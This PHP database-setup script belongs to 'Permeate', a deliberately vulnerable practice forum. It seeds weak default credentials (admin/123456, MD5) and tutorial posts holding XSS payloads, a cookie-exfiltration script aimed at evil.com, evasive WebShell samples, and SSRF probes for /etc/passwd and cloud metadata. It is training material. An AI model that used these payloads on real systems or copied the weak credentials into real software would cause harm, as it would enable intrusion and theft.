<?php
/**
 * SQLite数据库初始化脚本
 * 创建所有必要的数据表和初始数据
 */

// 定义根目录
define('ROOT_PATH', dirname(__DIR__));

// 加载配置
require_once ROOT_PATH . '/conf/dbconfig.php';
require_once ROOT_PATH . '/core/db_func.php';

echo "=== SQLite数据库初始化脚本 ===\n\n";

// 创建数据目录
$dataDir = dirname(DB_PATH);
if (!is_dir($dataDir)) {
    mkdir($dataDir, 0777, true);
    echo "创建数据目录: {$dataDir}\n";
}

// 获取数据库连接
$db = getDbConnection();

// 创建数据表SQL
$tables = array(
    // 用户表
    "CREATE TABLE IF NOT EXISTS bbs_user (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username VARCHAR(32) NOT NULL DEFAULT '72user',
        email VARCHAR(32) NOT NULL DEFAULT '',
        password CHAR(32) NOT NULL DEFAULT '72pass',
        rtime INTEGER NOT NULL DEFAULT 0,
        rip INTEGER NOT NULL DEFAULT 0,
        admins INTEGER NOT NULL DEFAULT 0
    )",

    // 用户详情表
    "CREATE TABLE IF NOT EXISTS bbs_user_detail (
        uid INTEGER PRIMARY KEY,
        t_name VARCHAR(32) DEFAULT '',
        age INTEGER NOT NULL DEFAULT 0,
        sex INTEGER NOT NULL DEFAULT 0,
        edu INTEGER NOT NULL DEFAULT 0,
        signed TEXT,
        pic VARCHAR(255) NOT NULL DEFAULT '/resources/images/userhead/default.gif',
        telphone VARCHAR(32) NOT NULL DEFAULT '',
        qq INTEGER NOT NULL DEFAULT 0,
        email VARCHAR(255) NOT NULL DEFAULT '',
        brithday INTEGER NOT NULL DEFAULT 0,
        picm VARCHAR(255) NOT NULL DEFAULT '/resources/images/userhead/defaultm.gif',
        pics VARCHAR(255) NOT NULL DEFAULT '/resources/images/userhead/defaults.gif'
    )",

    // 分区表
    "CREATE TABLE IF NOT EXISTS bbs_part (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        pname VARCHAR(255) NOT NULL DEFAULT '默认分区',
        padmins INTEGER NOT NULL DEFAULT 6
    )",

    // 版块表
    "CREATE TABLE IF NOT EXISTS bbs_cate (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        pid INTEGER NOT NULL DEFAULT 0,
        cname VARCHAR(255) NOT NULL DEFAULT '默认板块',
        uid INTEGER NOT NULL DEFAULT 0
    )",

    // 帖子表
    "CREATE TABLE IF NOT EXISTS bbs_post (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        cid INTEGER NOT NULL DEFAULT 0,
        title VARCHAR(1000) NOT NULL DEFAULT '帖子标题',
        content TEXT,
        ptime INTEGER NOT NULL DEFAULT 0,
        uid INTEGER NOT NULL DEFAULT 0,
        pip VARCHAR(1000) NOT NULL DEFAULT '0',
        count INTEGER NOT NULL DEFAULT 0,
        del INTEGER NOT NULL DEFAULT 1,
        view_count INTEGER NOT NULL DEFAULT 0
    )",

    // 回复表
    "CREATE TABLE IF NOT EXISTS bbs_reply (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        pid INTEGER NOT NULL DEFAULT 0,
        content TEXT,
        uid INTEGER NOT NULL DEFAULT 0,
        ptime INTEGER NOT NULL DEFAULT 0,
        pip INTEGER NOT NULL DEFAULT 0,
        xx INTEGER NOT NULL DEFAULT 1
    )",

    // 友情链接表
    "CREATE TABLE IF NOT EXISTS bbs_fri (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        title VARCHAR(255) NOT NULL DEFAULT '百度',
        desc1 VARCHAR(255) NOT NULL DEFAULT '百度一下,你就知道',
        url VARCHAR(255) NOT NULL DEFAULT 'http://www.baidu.com',
        pic VARCHAR(255) NOT NULL DEFAULT 'default_fri.gif'
    )",

    // IP黑名单表
    "CREATE TABLE IF NOT EXISTS bbs_iprefuse (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ipmin VARCHAR(20) NOT NULL,
        ipmax VARCHAR(20) NOT NULL
    )",

    // 敏感词表
    "CREATE TABLE IF NOT EXISTS bbs_fil (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        hinge VARCHAR(32) NOT NULL
    )",

    // 关注表
    "CREATE TABLE IF NOT EXISTS bbs_home_follow (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        uid INTEGER NOT NULL DEFAULT 0,
        username CHAR(15) NOT NULL,
        followuid INTEGER NOT NULL DEFAULT 0,
        fusername CHAR(15) NOT NULL,
        status INTEGER NOT NULL DEFAULT 0,
        mutual INTEGER NOT NULL DEFAULT 0,
        uptiem INTEGER NOT NULL DEFAULT 0
    )"
);

// 创建索引
$indexes = array(
    "CREATE INDEX IF NOT EXISTS idx_post_cid ON bbs_post(cid)",
    "CREATE INDEX IF NOT EXISTS idx_post_uid ON bbs_post(uid)",
    "CREATE INDEX IF NOT EXISTS idx_post_del ON bbs_post(del)",
    "CREATE INDEX IF NOT EXISTS idx_reply_pid ON bbs_reply(pid)",
    "CREATE INDEX IF NOT EXISTS idx_reply_uid ON bbs_reply(uid)",
    "CREATE INDEX IF NOT EXISTS idx_follow_uid ON bbs_home_follow(uid)",
    "CREATE INDEX IF NOT EXISTS idx_follow_followuid ON bbs_home_follow(followuid)"
);

// 执行创建表
echo "创建数据表...\n";
foreach ($tables as $sql) {
    try {
        $db->exec($sql);
        echo "  [OK] ";
        preg_match('/CREATE TABLE.*?(\w+)/i', $sql, $matches);
        echo isset($matches[1]) ? $matches[1] : 'table';
        echo "\n";
    } catch (PDOException $e) {
        echo "  [FAIL] " . $e->getMessage() . "\n";
    }
}

// 执行创建索引
echo "\n创建索引...\n";
foreach ($indexes as $sql) {
    try {
        $db->exec($sql);
        echo "  [OK] index created\n";
    } catch (PDOException $e) {
        echo "  [SKIP] " . $e->getMessage() . "\n";
    }
}

// 插入初始数据
echo "\n插入初始数据...\n";

// 检查是否已有数据
$count = $db->query("SELECT COUNT(*) as c FROM bbs_user")->fetch()['c'];

if ($count == 0) {
    $time = time();
    $password = md5('123456');

    // ========== 用户数据 ==========
    echo "  创建用户数据...\n";

    $users = [
        [1, 'admin', 'admin@test.com', '管理员', '欢迎来到Permeate渗透测试靶场！作者：汤青松，微信：songboy8888', 1],
        [2, 'test', 'test@test.com', '测试用户', '学习Web安全，推荐《PHP Web安全开发实战》', 0],
        [3, 'security', 'security@test.com', '安全研究员', '安全研究，永无止境 | 微信：songboy8888', 0],
        [4, 'hacker', 'hacker@test.com', '白帽子', '《PHP Web安全开发实战》读者', 0],
        [5, 'developer', 'dev@test.com', '开发者', '安全编码，从源头防御', 0],
    ];

    $stmt = $db->prepare("INSERT INTO bbs_user (id, username, email, password, rtime, rip, admins) VALUES (?, ?, ?, ?, ?, 0, ?)");
    $stmtDetail = $db->prepare("INSERT INTO bbs_user_detail (uid, t_name, signed, pic, picm, pics) VALUES (?, ?, ?, '/resources/images/userhead/default.gif', '/resources/images/userhead/defaultm.gif', '/resources/images/userhead/defaults.gif')");

    foreach ($users as $u) {
        $stmt->execute([$u[0], $u[1], $u[2], $password, $time, $u[5]]);
        $stmtDetail->execute([$u[0], $u[3], $u[4]]);
    }
    echo "    [OK] 5个用户\n";

    // ========== 分区数据 ==========
    echo "  创建分区数据...\n";
    $db->exec("INSERT INTO bbs_part (id, pname, padmins) VALUES (1, '常规漏洞', 1)");
    $db->exec("INSERT INTO bbs_part (id, pname, padmins) VALUES (2, '逻辑漏洞', 1)");
    echo "    [OK] 2个分区\n";

    // ========== 版块数据 ==========
    echo "  创建版块数据...\n";
    $cates = [
        [1, 1, 'SQL注入'], [2, 1, 'XSS跨站'], [3, 1, '命令执行'], [4, 1, '文件上传'],
        [5, 2, '密码找回'], [6, 2, '越权访问'], [7, 2, 'SSRF漏洞'], [8, 2, '验证码绕过'],
    ];
    foreach ($cates as $c) {
        $db->exec("INSERT INTO bbs_cate (id, pid, cname, uid) VALUES ({$c[0]}, {$c[1]}, '{$c[2]}', 0)");
    }
    echo "    [OK] 8个版块\n";

    // ========== 帖子数据 ==========
    echo "  创建帖子数据...\n";

    $posts = [
        // SQL注入板块
        [1, 1, 'SQL注入基础入门教程', '<h3>什么是SQL注入？</h3><p>SQL注入是一种常见的Web安全漏洞，攻击者通过构造恶意的SQL语句，实现对数据库的非法操作。</p><h4>漏洞原理</h4><p>当用户输入的数据未经充分过滤就直接拼接到SQL语句中时，攻击者可以构造特殊字符来改变原SQL语句的逻辑，从而执行任意SQL命令。</p><h4>常见注入类型</h4><ul><li>联合查询注入 (UNION)</li><li>布尔盲注</li><li>时间盲注</li><li>报错注入</li></ul><p><strong>练习提示：</strong>本站的搜索功能存在SQL注入漏洞，欢迎尝试！</p>', 1],
        [2, 1, 'MySQL手动注入实战技巧', '<h3>MySQL注入技巧总结</h3><h4>1. 信息收集</h4><pre><code>SELECT @@version\nSELECT database()\nSELECT user()</code></pre><h4>2. 获取表名</h4><pre><code>SELECT table_name FROM information_schema.tables WHERE table_schema=database()</code></pre><h4>3. 获取字段名</h4><pre><code>SELECT column_name FROM information_schema.columns WHERE table_name=users</code></pre><p>更多技巧欢迎在靶场中实践！</p>', 1],
        [3, 1, 'SQL注入防护与绕过技巧', '<h3>SQL注入防护方案</h3><ol><li>使用<strong>预处理语句</strong>（推荐）</li><li>使用<strong>参数化查询</strong></li><li>对用户输入进行<strong>严格过滤</strong></li><li>使用<strong>WAF</strong>进行防护</li></ol><h3>常见绕过技巧</h3><ul><li>大小写混合：SeLeCt</li><li>编码绕过：URL编码、Hex编码</li><li>注释符：/**/、--、#</li><li>空格替代：/**/、%20、%09</li></ul><p>安全无小事，防御需全面！</p>', 2],

        // XSS跨站板块
        [4, 2, 'XSS跨站脚本攻击详解', '<h3>XSS攻击概述</h3><p>XSS（Cross-Site Scripting）跨站脚本攻击，是一种常见的Web前端安全漏洞。</p><h4>攻击类型</h4><ul><li><strong>反射型XSS</strong>：恶意脚本通过URL参数传递，服务器将其反射回响应页面</li><li><strong>存储型XSS</strong>：恶意脚本被存储到服务器，每次访问都会执行</li><li><strong>DOM型XSS</strong>：恶意脚本通过修改DOM环境执行</li></ul><h4>常见Payload</h4><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;img src=x onerror=alert(1)&gt;\n&lt;svg onload=alert(1)&gt;</code></pre><p><strong>练习提示：</strong>本站帖子回复功能存在存储型XSS漏洞！</p>', 1],
        [5, 2, 'XSS攻击实战：窃取Cookie', '<h3>利用XSS窃取用户Cookie</h3><p>XSS攻击最常见的危害之一是窃取用户Cookie，进而实现账号劫持。</p><h4>攻击步骤</h4><ol><li>构造恶意脚本获取Cookie</li><li>将Cookie发送到攻击者服务器</li><li>利用Cookie伪造用户身份</li></ol><h4>示例Payload</h4><pre><code>&lt;script&gt;\nnew Image().src="http://evil.com/steal?c="+document.cookie;\n&lt;/script&gt;</code></pre><h4>防御措施</h4><p>设置Cookie的HttpOnly属性，防止JavaScript访问Cookie。</p>', 3],
        [6, 2, 'XSS过滤器绕过技巧大全', '<h3>XSS过滤器绕过技巧</h3><h4>1. 事件处理器绕过</h4><pre><code>&lt;img src=x onerror=alert(1)&gt;\n&lt;body onload=alert(1)&gt;\n&lt;input onfocus=alert(1) autofocus&gt;</code></pre><h4>2. 编码绕过</h4><pre><code>&lt;script&gt;eval(atob(\'YWxlcnQoMSk=\'))&lt;/script&gt;</code></pre><h4>3. 标签变形</h4><pre><code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;\n&lt;img/src=x/onerror=alert(1)&gt;</code></pre><p>持续更新中...</p>', 4],

        // 命令执行板块
        [7, 3, '命令执行漏洞原理与利用', '<h3>命令执行漏洞</h3><p>命令执行漏洞是指攻击者可以在服务器上执行系统命令，危害极大。</p><h4>常见危险函数</h4><ul><li>PHP: system(), exec(), shell_exec(), passthru(), popen()</li><li>Java: Runtime.exec(), ProcessBuilder</li><li>Python: os.system(), subprocess</li></ul><h4>常见连接符</h4><pre><code>;  命令顺序执行\n|  管道，前一个命令输出作为后一个输入\n|| 前一个命令失败才执行后一个\n&& 前一个命令成功才执行后一个\n&  后台执行</code></pre><p><strong>练习提示：</strong>后台数据库备份功能存在命令执行漏洞！</p>', 1],
        [8, 3, 'PHP代码执行漏洞详解', '<h3>PHP代码执行漏洞</h3><p>PHP代码执行漏洞允许攻击者执行任意PHP代码。</p><h4>危险函数</h4><ul><li>eval()</li><li>assert()</li><li>preg_replace() + /e修饰符</li><li>create_function()</li><li>array_map()等回调函数</li></ul><h4>常见利用方式</h4><pre><code>?cmd=system(\'ls\');\n?file=php://filter/... (伪协议)\n?data=${@phpinfo()}</code></pre><p>掌握这些技巧，提升渗透能力！</p>', 2],

        // 文件上传板块
        [9, 4, '文件上传漏洞利用技巧', '<h3>文件上传漏洞</h3><p>文件上传漏洞允许攻击者上传恶意文件（如WebShell）到服务器。</p><h4>常见绕过方式</h4><ul><li><strong>前端绕过</strong>：禁用JS、修改请求</li><li><strong>后端绕过</strong>：<ul><li>MIME类型伪造</li><li>扩展名大小写：.pHp, .PHP</li><li>特殊扩展名：.php5, .phtml</li><li>双写绕过：.pphphp</li><li>空格/点号绕过：.php. .php </li></ul></li></ul><h4>WebShell示例</h4><pre><code>&lt;?php @eval($_POST[\'cmd\']); ?&gt;\n&lt;?php system($_GET[\'c\']); ?&gt;</code></pre><p><strong>练习提示：</strong>个人中心的头像上传功能可以尝试！</p>', 1],
        [10, 4, 'WebShell木马免杀技术', '<h3>WebShell免杀技术</h3><h4>1. 字符串变形</h4><pre><code>&lt;?php\n$a = \'ev\.\'al\';\n$a($_POST[\'c\']);\n?&gt;</code></pre><h4>2. 编码绕过</h4><pre><code>&lt;?php\n$a = base64_decode(\'ZXZhbA==\');\n$a($_POST[\'c\']);\n?&gt;</code></pre><h4>3. 回调函数</h4><pre><code>&lt;?php\narray_map($_GET[\'f\'], array($_POST[\'c\']));\n?&gt;</code></pre><p>安全研究，请勿用于非法用途！</p>', 3],

        // 密码找回板块
        [11, 5, '密码重置漏洞深度分析', '<h3>密码重置漏洞类型</h3><h4>1. 验证码绕过</h4><p>验证码未正确销毁，可重复使用</p><h4>2. Token可预测</h4><p>重置Token使用时间戳、递增数字等可预测方式生成</p><h4>3. 用户身份伪造</h4><p>通过修改请求参数（如email、uid）修改任意用户密码</p><h4>4. 回显敏感信息</h4><p>响应中泄露Token或验证码</p><p><strong>练习提示：</strong>本站的密码找回功能存在多个漏洞，欢迎测试！</p>', 1],
        [12, 5, '实战：任意用户密码重置', '<h3>任意用户密码重置实战</h3><h4>漏洞场景</h4><p>某系统密码重置功能存在逻辑漏洞：</p><ol><li>输入邮箱后，系统发送重置链接</li><li>重置页面未验证Token是否与邮箱匹配</li><li>攻击者可修改email参数重置任意用户密码</li></ol><h4>攻击Payload</h4><pre><code>GET /reset?email=victim@test.com&code= HTTP/1.1</code></pre><p>即使code为空，也能直接访问重置页面并修改密码！</p><p>这是一个严重的安全隐患！</p>', 2],

        // 越权访问板块
        [13, 6, '越权漏洞全面解析', '<h3>越权漏洞分类</h3><h4>水平越权</h4><p>相同权限级别的用户之间可以互相访问对方的数据</p><h4>垂直越权</h4><p>低权限用户可以访问高权限用户的功能</p><h4>常见场景</h4><ul><li>修改个人资料时，通过uid参数访问其他用户数据</li><li>订单系统中，通过订单号查看他人订单</li><li>后台管理功能未做权限校验</li></ul><p><strong>练习提示：</strong>个人资料修改功能存在水平越权漏洞！</p>', 1],
        [14, 6, '越权漏洞挖掘方法论', '<h3>越权漏洞挖掘技巧</h3><h4>1. 参数篡改</h4><ul><li>修改URL中的ID参数</li><li>修改POST数据中的用户标识</li><li>尝试数组越权：id[]=1&id[]=2</li></ul><h4>2. 请求重放</h4><p>使用Burp Suite重放请求，修改身份信息</p><h4>3. 权限矩阵测试</h4><p>测试不同角色用户对各功能的访问权限</p><h4>防御建议</h4><ul><li>服务端严格验证用户权限</li><li>使用Token代替可预测的ID</li><li>重要操作进行二次验证</li></ul>', 3],

        // SSRF漏洞板块
        [15, 7, 'SSRF服务端请求伪造详解', '<h3>SSRF漏洞原理</h3><p>SSRF（Server-Side Request Forgery）服务端请求伪造，攻击者利用服务器发起请求。</p><h4>危害</h4><ul><li>探测内网服务</li><li>读取本地文件</li><li>攻击内网应用</li><li>云环境元数据泄露</li></ul><h4>常见利用协议</h4><pre><code>file:///etc/passwd\nhttp://127.0.0.1:6379/\ndict://127.0.0.1:6379/info\ngopher://...</code></pre><p><strong>练习提示：</strong>远程头像功能存在SSRF漏洞！</p>', 1],
        [16, 7, 'SSRF漏洞利用进阶', '<h3>SSRF进阶利用</h3><h4>1. 内网端口扫描</h4><pre><code>http://127.0.0.1:{port}/\nhttp://192.168.1.1-254:80/</code></pre><h4>2. Redis未授权攻击</h4><pre><code>dict://127.0.0.1:6379/INFO\ngopher://127.0.0.1:6379/_*1%0d%0a...</code></pre><h4>3. 云元数据获取</h4><pre><code>http://169.254.169.254/latest/meta-data/</code></pre><h4>4. 绕过技巧</h4><ul><li>短网址绕过</li><li>DNS重绑定</li><li>IPv6地址绕过</li><li>编码绕过</li></ul>', 2],

        // 验证码绕过板块
        [17, 8, '验证码安全攻防指南', '<h3>验证码安全问题</h3><h4>常见漏洞类型</h4><ol><li><strong>验证码复用</strong>：验证后未销毁，可重复使用</li><li><strong>验证码回显</strong>：响应中直接返回验证码</li><li><strong>验证码为空</strong>：空值绕过验证</li><li><strong>验证码固定</strong>：同一个验证码一直有效</li><li><strong>验证码可预测</strong>：基于时间或简单算法生成</li></ol><h4>防御建议</h4><pre><code>// 验证后立即销毁\nif ($_SESSION[\'captcha\'] === $input) {\n    unset($_SESSION[\'captcha\']);\n    // 验证通过\n}</code></pre><p><strong>练习提示：</strong>后台登录验证码存在绕过漏洞！</p>', 1],
        [18, 8, '图形验证码识别技术', '<h3>验证码识别方案</h3><h4>1. OCR识别</h4><p>使用Tesseract等OCR引擎识别简单验证码</p><h4>2. 打码平台</h4><p>对接专业打码平台进行人工识别</p><h4>3. 机器学习</h4><p>训练CNN模型识别特定类型验证码</p><h4>4. 模板匹配</h4><p>针对固定字符集的验证码，建立模板库匹配</p><h4>绕过思路优先级</h4><pre><code>逻辑漏洞 > 弱验证码 > 需识别 > 需人工</code></pre>', 2],

        // 置顶公告帖
        [19, 1, 'Web安全学习资源推荐', '<h3>📚 推荐书籍</h3><p>想深入学习PHP Web安全开发？强烈推荐：</p><div style="background:#f8f9fa;padding:20px;border-radius:8px;margin:15px 0;"><h4 style="margin:0 0 10px 0;color:#4f46e5;">《PHP Web安全开发实战》</h4><p style="margin:0;color:#666;">本书从实战角度出发，系统讲解PHP开发中的各种安全问题，涵盖SQL注入、XSS、CSRF、文件上传等常见漏洞的原理与防御，适合PHP开发者学习安全编码。</p></div><h3>👨‍💻 作者介绍</h3><p><strong>汤青松</strong>，多年Web安全从业经验，专注于PHP安全开发领域。</p><h3>📞 联系方式</h3><ul><li>微信：<strong>songboy8888</strong></li><li>QQ：<strong>78778443</strong></li></ul><p>欢迎交流Web安全技术问题！</p><hr style="margin:20px 0;border:none;border-top:1px solid #eee;"><p style="color:#999;font-size:13px;">本文为Permeate靶场系统内置教程，系统作者：汤青松</p>', 1],
    ];

    $stmtPost = $db->prepare("INSERT INTO bbs_post (id, cid, title, content, ptime, uid, pip, count, del, view_count) VALUES (?, ?, ?, ?, ?, ?, '127.0.0.1', 0, 1, ?)");

    foreach ($posts as $post) {
        $ptime = $time - rand(0, 86400 * 30);
        $view_count = rand(10, 500);
        $stmtPost->execute([$post[0], $post[1], $post[2], $post[3], $ptime, $post[4], $view_count]);
    }
    echo "    [OK] 19篇帖子\n";

    // ========== 回复数据 ==========
    echo "  创建回复数据...\n";

    $replies = [
        [1, '<p>好文章！学到了很多，感谢分享！</p>', 2],
        [1, '<p>请问如何判断注入点类型呢？</p>', 3],
        [1, '<p>回复楼上：可以通过单引号、and 1=1、and 1=2等方式判断。推荐看看《PHP Web安全开发实战》这本书</p>', 1],
        [2, '<p>information_schema是个好东西！</p>', 4],
        [4, '<p>XSS真的太危险了，前端必须做好过滤！</p>', 2],
        [4, '<p>这里是XSS测试区域</p>', 3],
        [5, '<p>Cookie设置了HttpOnly就不怕XSS窃取了吗？</p>', 5],
        [7, '<p>命令执行漏洞危害最大，一定要避免！</p>', 2],
        [9, '<p>上传漏洞配合解析漏洞更可怕</p>', 4],
        [11, '<p>密码找回逻辑真的很重要，很多大厂都翻车过</p>', 3],
        [13, '<p>越权漏洞在企业中太常见了</p>', 5],
        [15, '<p>SSRF可以打内网Redis，很危险</p>', 1],
        [17, '<p>验证码复用是最常见的问题</p>', 2],
        [19, '<p>已加微信：songboy8888，感谢分享！</p>', 3],
        [19, '<p>《PHP Web安全开发实战》这本书很实用，推荐！</p>', 4],
    ];

    $stmtReply = $db->prepare("INSERT INTO bbs_reply (pid, content, uid, ptime, pip, xx) VALUES (?, ?, ?, ?, 0, 1)");

    foreach ($replies as $reply) {
        $ptime = $time - rand(0, 86400 * 7);
        $stmtReply->execute([$reply[0], $reply[1], $reply[2], $ptime]);
    }
    echo "    [OK] 15条回复\n";

    // ========== 友情链接 ==========
    echo "  创建友情链接...\n";
    $db->exec("INSERT INTO bbs_fri (title, desc1, url, pic) VALUES ('《PHP Web安全开发实战》', 'PHP安全开发权威指南 - 汤青松著', 'https://book.douban.com/subject_search?search_text=PHP+Web%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91', '')");
    $db->exec("INSERT INTO bbs_fri (title, desc1, url, pic) VALUES ('OWASP', '开放式Web应用程序安全项目', 'https://owasp.org', '')");
    $db->exec("INSERT INTO bbs_fri (title, desc1, url, pic) VALUES ('PortSwigger', 'Web安全学院和Burp Suite', 'https://portswigger.net', '')");
    $db->exec("INSERT INTO bbs_fri (title, desc1, url, pic) VALUES ('FreeBuf', '网络安全行业门户', 'https://www.freebuf.com', '')");
    echo "    [OK] 4个友情链接\n";

    // ========== 敏感词 ==========
    echo "  创建敏感词...\n";
    $db->exec("INSERT INTO bbs_fil (hinge) VALUES ('赌博')");
    $db->exec("INSERT INTO bbs_fil (hinge) VALUES ('色情')");
    $db->exec("INSERT INTO bbs_fil (hinge) VALUES ('暴力')");
    echo "    [OK] 3个敏感词\n";

    echo "\n  [完成] 所有初始数据已创建\n";

} else {
    echo "  [SKIP] 数据库已有数据，跳过初始化\n";
}

echo "\n=== 数据库初始化完成 ===\n";
echo "数据库文件: " . DB_PATH . "\n";
echo "\n默认账号：\n";
echo "  管理员: admin / 123456\n";
echo "  测试用户: test / 123456\n";
echo "\n示例数据：\n";
echo "  用户: 5个\n";
echo "  帖子: 19篇\n";
echo "  回复: 15条\n";
echo "\n联系方式：\n";
echo "  作者: 汤青松\n";
echo "  微信: songboy8888\n";
echo "  QQ: 78778443\n";

// 创建安装锁文件
$lockFile = ROOT_PATH . '/install/install.lock';
file_put_contents($lockFile, date('Y-m-d H:i:s'));
echo "\n已创建安装锁文件: install/install.lock\n";
echo "现在可以访问系统首页了！\n";
?>
